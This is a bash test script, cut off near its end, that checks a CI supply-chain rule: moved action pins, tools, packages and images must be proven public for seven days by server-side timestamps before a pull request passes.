#!/usr/bin/env bash
# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3
# The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
# package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
# repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
#   python3 bin/pin-age-check.py --root REPO --base REV --head REV --fixtures FILE [--json FILE] [--now ISO] [--min-days N]
#   exit 0: nothing moved, or every moved version is old enough; exit 1: a moved version is too young or its age cannot be proven.
#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest).
#   Fixtures: {"now": ISO, "times": {ITEM: {"time": ISO, "source": S}}, "first_seen": {ITEM: ISO}}. Sources that count: github-release, pypi, go-index,
#   registry-push. A source of commit-date, tag-date or image-config is NEVER a proof (the publisher or the builder controls it).
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
CASE=""
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
NOW="2026-10-05T12:00:00Z"
d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))

# --- the base repository: one of every kind of pin --------------------------------------------------------------------
base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
cat >"$base/.github/workflows/ci.yml" <<EOF
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/own/ci@$DIG1
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: v2.13.2
      - uses: actions/setup-go@$SHA3 # v6.0.0
        with:
          go-version: '1.27'
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: '3.12'
      - run: |
          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
        with:
          version: '2.17.1'
      - uses: helm/kind-action@$SHA6 # v1.15.0
        with:
          node_image: kindest/node:v1.31.0@$DIG4
      - run: |
          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
          python3 -m pip install --quiet black==24.1.0
          docker run --rm alpine:3.20@$DIG5 true
EOF
cat >"$base/.github/actions/local/action.yml" <<EOF
name: local
runs:
  using: composite
  steps:
    - uses: actions/cache@$SHA5 # v4.2.0
EOF
cat >"$base/bin/install-scanner.sh" <<'EOF'
#!/usr/bin/env bash
TRIVY_VER=0.74.0
GRYPE_VER=0.118.0
GITSIGN_VER=0.17.1
EOF
cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
# hash-pinned
anthropic==1.9.0 \
    --hash=sha256:aaaa
requests==2.32.0 \
    --hash=sha256:bbbb
EOF
printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base

# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
newcase() {
  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
  ( cd "$work/$n" && python3 - "$2" <<'PY'
import sys
exec(sys.argv[1])
PY
    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
}
# runck NAME FIXTURES-JSON [extra args] -> sets rc, $work/NAME.out
runck() {
  local n=$1 fx=$2; shift 2; echo "$fx" >"$work/$n.fx.json"; rc=0
  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --fixtures "$work/$n.fx.json" --now "$NOW" --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
}
sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }
OLD=$(d 10); YOUNG=$(d 3)

# --- nothing moves ------------------------------------------------------------------------------------------------------
newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
runck none '{"times": {}}'
CASE="no pin moved: exit 0, says so, and needs no data at all"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/none.out"

# --- an action pin moves: AC2 names it, AC3 measures its age ---------------------------------------------------------------
NEW1=$(printf 'a%.0s' $(seq 40))
newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}"
CASE="a moved action pin whose release is 10 days old passes, and the check NAMES it"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
CASE="the same pin released 3 days ago FAILS (exit 1) and says how young it is"
check test "$rc" -eq 1; check grep -qi 'FAIL' "$work/act.out"; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act '{"times": {}}'
CASE="a moved pin with no age data FAILS: age not provable is a failure, never a pass"
check test "$rc" -eq 1; check grep -qi 'not provable\|cannot prove\|unprovable' "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"github-release\"}}}"
CASE="a RELEASE date alone never proves an action (a tag can be moved under an old release): fails, though a tool's release date still counts"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"commit-date\"}}}"
CASE="a COMMIT date is never a proof of age (the publisher controls it): fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"tag-date\"}}}"
CASE="a TAG date is never a proof either: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$OLD\"}}"
CASE="when the release is young but the exact version first appeared in one of OUR pull requests 10 days ago, it passes (the third server-side source)"
check test "$rc" -eq 0
runck act "{\"times\": {}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$YOUNG\"}}"
CASE="first seen in our own PR only 3 days ago: still too young, fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 7)\", \"source\": \"observer\"}}}"
CASE="exactly 7 days old passes (the boundary is 7 days, not 7 days and a minute)"
check test "$rc" -eq 0
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 6.99)\", \"source\": \"observer\"}}}"
CASE="just under 7 days old fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"2099-01-01T00:00:00Z\", \"source\": \"observer\"}}}"
CASE="a publish time in the FUTURE is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"not a date\", \"source\": \"observer\"}}}"
CASE="an unparseable time is unprovable: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"made-up\"}}}"
CASE="a source the check does not know is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}" --min-days 30
CASE="--min-days is honoured (a 10-day-old version fails a 30-day rule)"
check test "$rc" -eq 1

# --- every other kind of pin the age check covers (AC2) ---------------------------------------------------------------------
cover() { # <name> <edit> <item key> <source>
  newcase "$1" "$2"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$OLD\", \"source\": \"$4\"}}}"
  CASE="$1: moved, named and (10 days old via $4) accepted"; check test "$rc" -eq 0; check grep -qF "$3" "$work/$1.out"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$YOUNG\", \"source\": \"$4\"}}}"
  CASE="$1: the same item 3 days old fails"; check test "$rc" -eq 1
  runck "$1" '{"times": {}}'
  CASE="$1: with no age data fails"; check test "$rc" -eq 1
}
cover tool-scanner "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')" "tool:trivy@0.75.0" github-release
cover tool-gitsign "$(sub bin/install-scanner.sh 'GITSIGN_VER=0.17.1' 'GITSIGN_VER=0.18.0')" "tool:gitsign@0.18.0" github-release
cover tool-installer-input "$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.14.0')" "tool:golangci-lint@v2.14.0" github-release
cover tool-python-version "$(sub .github/workflows/ci.yml "python-version: '3.12'" "python-version: '3.13'")" "tool:python@3.13" github-release
cover gotool "$(sub .github/workflows/ci.yml 'gosec@v2.29.0' 'gosec@v2.30.0')" "gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0" go-index
cover package "$(sub .github/pins/adjudicator-requirements.txt 'anthropic==1.9.0' 'anthropic==1.10.0')" "package:pypi/anthropic@1.10.0" pypi
cover image-container "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci@$DIG3")" "image:ghcr.io/own/ci@$DIG3" registry-push
cover tool-goreleaser "$(sub .github/workflows/ci.yml "version: '2.17.1'" "version: '2.18.0'")" "tool:goreleaser@2.18.0" github-release
cover tool-curl-download "$(sub .github/workflows/ci.yml 'releases/download/v2.40.0/gh_2.40.0_linux_amd64' 'releases/download/v2.41.0/gh_2.41.0_linux_amd64')" "tool:cli/cli@2.41.0" github-release
cover package-in-run-step "$(sub .github/workflows/ci.yml 'black==24.1.0' 'black==24.2.0')" "package:pypi/black@24.2.0" pypi
cover image-in-run-step "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "alpine:3.20@$DIG3")" "image:alpine@$DIG3" registry-push
cover image-installer-input "$(sub .github/workflows/ci.yml "kindest/node:v1.31.0@$DIG4" "kindest/node:v1.31.0@$DIG3")" "image:kindest/node@$DIG3" registry-push
NEW5=$(printf 'b%.0s' $(seq 40))
cover local-composite-action "$(sub .github/actions/local/action.yml "actions/cache@$SHA5" "actions/cache@$NEW5")" "action:actions/cache@$NEW5" observer

# --- a go install tool: the module INDEX's time, never the version-control time -------------------------------------------------
runck gotool "{\"times\": {\"gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0\": {\"time\": \"$OLD\", \"source\": \"vcs-time\"}}}"
CASE="a go install tool's age from the version-control .info time is refused (the index timestamp is the server-side one): fails"
check test "$rc" -eq 1
# --- an image: the registry's push time, never the image's own created field ----------------------------------------------------
runck image-container "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"image-config\"}}}"
CASE="an image's own 'created' field is refused (the builder sets it): fails"
check test "$rc" -eq 1

# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
runck tagdigest "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"registry-push\"}}}"
CASE="an image written name:tag@sha256:digest is the SAME item as name@sha256:digest (the tag is ignored): moved, named by its digest, and accepted at 10 days"
check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ci@$DIG3" "$work/tagdigest.out"
newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
runck tagonly '{"times": {}}'
CASE="an image with only a tag (no digest) is not a pin the age check can measure: it fails rather than passing silently"
check test "$rc" -eq 1

# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
$(sub go.mod 'go1.27.1' 'go1.27.2')
$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
$(sub go.mod 'v1.0.0' 'v1.1.0')"
runck notcovered '{"times": {}}'
CASE="the product base image, a Go module bump, go.mod's toolchain and setup-go's version are NOT covered: they move with no data and no failure"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/notcovered.out"

# --- several moves: every one is named, one young one fails the whole check ---------------------------------------------------------
newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' 'requests==2.33.0')"
runck multi "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}, \"tool:trivy@0.75.0\": {\"time\": \"$YOUNG\", \"source\": \"github-release\"}, \"package:pypi/requests@2.33.0\": {\"time\": \"$OLD\", \"source\": \"pypi\"}}}"
CASE="three moves, one of them 3 days old: exit 1, and the output names ALL THREE (so a reviewer sees what moved) and blames the young one"
check test "$rc" -eq 1
check grep -qF "action:actions/checkout@$NEW1" "$work/multi.out"; check grep -qF "tool:trivy@0.75.0" "$work/multi.out"; check grep -qF "package:pypi/requests@2.33.0" "$work/multi.out"
check python3 - "$work/multi.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
moved = {m["item"]: m for m in d["moved"]}
assert set(moved) == {"action:actions/checkout@" + "a" * 40, "tool:trivy@0.75.0", "package:pypi/requests@2.33.0"}, sorted(moved)
assert moved["tool:trivy@0.75.0"]["ok"] is False and moved["package:pypi/requests@2.33.0"]["ok"] is True, moved
PY

# --- a NEW pin counts as moved; a removed pin is no age problem --------------------------------------------------------------
NEW6=$(printf 'c%.0s' $(seq 40))
newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
runck added '{"times": {}}'
CASE="a brand-new action pin counts as moved: with no age data it fails"
check test "$rc" -eq 1; check grep -qF "action:actions/upload-artifact@$NEW6" "$work/added.out"
newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
runck removed '{"times": {}}'
CASE="removing a pin is not an age problem: exit 0"
check test "$rc" -eq 0

# --- a moved pin whose version is the SAME item elsewhere (the same commit used twice) is judged once, and an UNCHANGED pin never needs data ----------
runck none '{"times": {}}'
CASE="an unchanged workflow with 5 pins needs no data (only what MOVED is measured)"
check test "$rc" -eq 0

# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unmeasured) --------------------------------------------
newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
import pathlib, shutil
shutil.copy('.github/workflows/ci.yml', '.github/workflows/\u00e9.yml')
pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@$NEW1', 'actions/checkout@$SHA1'))"
runck unicode '{"times": {}}'
CASE="a new pin in .github/workflows/\u00e9.yml (a non-ASCII file name) is named and measured like any other"
check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEW1" "$work/unicode.out"

# --- the age of an ACTION's exact commit: our own scheduled observer first saw the tag at it, or the PR clock; a release date proves nothing (advisor 0183) -----------------------------------------
stubpy="$here/gh-map-stub.py"
mkstate() { # <state json> -> a zip holding state.json, base64
  python3 -c "import base64,io,json,sys,zipfile;b=io.BytesIO();z=zipfile.ZipFile(b,'w');z.writestr('state.json',sys.argv[1]);z.close();print(base64.b64encode(b.getvalue()).decode())" "$1"
}
ACTR=o/act
liveproof() { # <state or ->  <run event>  <label>  -> prints the live_proofs list for action o/act@$SHA1
  local state=$1 event=$2 label=${3:-v4.1.0}
  python3 - "$work/map.json" "$state" "$event" "$SHA1" "$(d 8)" <<'PY'
import base64, io, json, sys, zipfile
m = {}
if sys.argv[2] != "-":
    b = io.BytesIO(); z = zipfile.ZipFile(b, "w"); z.writestr("state.json", sys.argv[2]); z.close()
    m["repos/o/r/actions/workflows/supply-chain.yml/runs?event=schedule&branch=main&status=success&per_page=100"] = {"workflow_runs": [{"id": 7, "event": sys.argv[3], "head_branch": "main", "conclusion": "success", "path": ".github/workflows/supply-chain.yml", "created_at": sys.argv[5]}]}
    m["repos/o/r/actions/runs/7/artifacts"] = {"artifacts": [{"id": 9, "name": "tag-observations", "expired": False}]}
    m["repos/o/r/actions/artifacts/9/zip"] = {"__b64": base64.b64encode(b.getvalue()).decode()}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$SHA1" "$stubpy" "$label" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[3], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
ac._tag_refs = lambda repo: {"v4": sys.argv[2], "v4.1.0": sys.argv[2]}
try:
    print(ac.live_proofs(ac.inv.Item("action", "o/act", sys.argv[2], sys.argv[4]), "."))
except ac.CouldNotLook as e:
    print("COULDNOTLOOK", e)
PY
) 2>&1 | tail -1; }
GOODSTATE=$(python3 -c "import json,sys;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+sys.argv[1]:'2026-09-01T00:00:00Z'}}))" "$SHA1")
out=$(liveproof "$GOODSTATE" schedule)
CASE="observer: our scheduled run first saw v4.1.0 at the pinned commit on 2026-09-01: an observer proof with that time"
case "$out" in *"2026-09-01T00:00:00Z', 'observer'"*) ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" push)
CASE="observer: a run that is not event=schedule is never read (a PR cannot forge the state): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
MOVED=$(python3 -c "import json;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+'e'*40:'2026-01-01T00:00:00Z'}}))")
out=$(liveproof "$MOVED" schedule)
CASE="observer: the tag was seen on 2026-01-01 at a DIFFERENT commit; its move to the pinned commit was never observed: no proof (the tj-actions pattern)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" schedule v9.9.9)
CASE="observer: the # version label must itself resolve to the pinned commit (v9.9.9 does not): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof - schedule)
CASE="observer: no scheduled run has produced state yet: nothing observed, no proof, and no error (ages only get younger)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "not json" schedule)
CASE="observer: a state that exists but cannot be read is loud (could not look), never 'nothing observed'"
case "$out" in COULDNOTLOOK*) ok "$CASE";; *) bad "$CASE ($out)";; esac

# --- the PR clock: the first workflow run on the commit that INTRODUCED the version in this PR (server-side), never a PR's creation time or text -----------------------------------------------
rm -rf "$work/pc"; mkdir -p "$work/pc/.github/workflows"; git -C "$work/pc" init -q
gc() { git -C "$work/pc" add -A; git -C "$work/pc" -c user.name=t -c user.email=t@x commit -q -m "$1"; }
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc base
printf 'on: x\n# 21 21 21 mentioned in a comment\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc decoy
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n      - uses: actions/setup-java@%s # v5\n        with:\n          java-version: 21\n' "$SHA6" >"$work/pc/.github/workflows/a.yml"; gc introduce
printf '# later\n' >>"$work/pc/.github/workflows/a.yml"; gc later
BASEC=$(git -C "$work/pc" rev-parse HEAD~3); DECOY=$(git -C "$work/pc" rev-parse HEAD~2); INTRO=$(git -C "$work/pc" rev-parse HEAD~1); HEADC=$(git -C "$work/pc" rev-parse HEAD)
pcclock() { # <runs json for the introducing commit or ->
  python3 - "$work/map.json" "$INTRO" "$HEADC" "$1" "$DECOY" <<'PY'
import json, sys
m = {"repos/o/r/actions/runs?head_sha=" + sys.argv[3] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-10-04T00:00:00Z"}]},
     "repos/o/r/actions/runs?head_sha=" + sys.argv[5] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-09-01T00:00:00Z"}]}}
if sys.argv[4] != "-":
    m["repos/o/r/actions/runs?head_sha=" + sys.argv[2] + "&per_page=100"] = {"workflow_runs": json.loads(sys.argv[4])}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$stubpy" "$work/pc" "$BASEC" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[2], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[3], sys.argv[4], "HEAD"))
PY
) 2>&1 | tail -1; }
CASE="PR clock: the earliest workflow run on the first commit whose INVENTORY holds the item (not on an earlier commit that merely mentions 21 in a comment, nor the later head)"
check test "$(pcclock '[{"created_at":"2026-09-20T00:00:00Z"},{"created_at":"2026-09-25T00:00:00Z"}]')" = 2026-09-20T00:00:00Z
CASE="PR clock: no run on the introducing commit means no clock (the later commit's runs do not count)"
check test "$(pcclock -)" = None
CASE="PR clock: outside a PR (no base) there is no clock"
check test "$(cd "$work" && GITHUB_REPOSITORY=o/r python3 - "$chk" "$work/pc" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[2], None))
PY
)" = None

# --- tools: the NEWEST of the release date and every asset's own created/updated time; PyPI: the newest file ------------------------------------------------------------------------------------
CASE="a tool's release proof is the newest asset time: an asset replaced yesterday in an old release is young again"
check python3 - "$chk" "$stubpy" "$work" <<'PY'
import importlib.util, json, os, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
json.dump({"repos/aquasecurity/trivy/releases/tags/0.75.0": {"message": "x"}, "repos/aquasecurity/trivy/releases/tags/v0.75.0": {"published_at": "2026-01-01T00:00:00Z", "draft": False,
           "assets": [{"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-10-04T00:00:00Z"}]}}, open(sys.argv[3] + "/map.json", "w"))
os.environ["GH_MAP"] = sys.argv[3] + "/map.json"
orig = subprocess.run
subprocess.run = lambda cmd, *a, **k: orig([sys.argv[2], *cmd[1:]] if cmd and cmd[0] == "gh" else cmd, *a, **k)
ac._OBS.clear()
got = ac.live_proofs(ac.inv.Item("tool", "trivy", "0.75.0"), ".")
assert got == [("2026-10-04T00:00:00Z", "github-release")], got
PY


# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
runck extras '{"times": {}}'
CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
check bash -c "! grep -rq PRIVATE_VERSION '$work/extras.out' '$work/extras.json'"; check grep -qF 'gotool:example.org/tool@${{expression}}' "$work/extras.out"
newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
git -C "$work/subdir" commit -q --amend -m head
newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
runck subdir2 '{"times": {}}'
CASE="an action's subdirectory is part of its identity: github/codeql-action/analyze@sha is named as such"
check test "$rc" -eq 1; check grep -qF "action:github/codeql-action/analyze@$SHA6" "$work/subdir2.out"
newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
runck indentreq '{"times": {}}'
CASE="an indented requirements line and a requirement with extras are read"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.40.0" "$work/indentreq.out"

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
try:
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
except RuntimeError as e:
    assert "refusing to read it partially" in str(e)
else:
    raise AssertionError("an over-long command line was read as its prefix")
assert time.time() - t < 3, time.time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, (unpinned) or an expression is NEVER a pin that can pass the age check"
check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
